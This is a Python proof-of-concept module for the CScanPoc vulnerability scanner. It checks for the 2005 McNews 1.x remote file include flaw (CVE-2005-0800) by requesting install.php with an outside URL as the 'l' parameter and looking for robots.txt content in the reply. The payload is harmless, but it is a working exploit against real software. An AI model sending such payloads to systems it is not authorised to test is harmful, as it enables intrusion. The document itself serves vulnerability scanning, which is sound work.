# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'McNews_0000'  # 平台漏洞编号
    name = 'McNews 1.x Install.PHP Arbitrary File Include Vulnerability'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2005-05-02'  # 漏洞公布时间
    desc = '''
        McNews 1.x Install.PHP文件存在远程文件包含漏洞。
        /admin/install.php?l=http://baidu.com/robots.txt
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2005-0665'
    cnvd_id = 'CNVD-2005-0665'  # cnvd漏洞编号
    cve_id = 'CVE-2005-0800'  # cve编号
    product = 'McNews'  # 漏洞组件名称
    product_version = '1.x'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '7571a3bd-8cca-4097-bedd-281294e26314'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            vul_url = arg + '/admin/install.php?l=http://baidu.com/robots.txt'
            response = requests.get(vul_url).text
            if 'Baiduspider' in response or 'Googlebot' in response:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
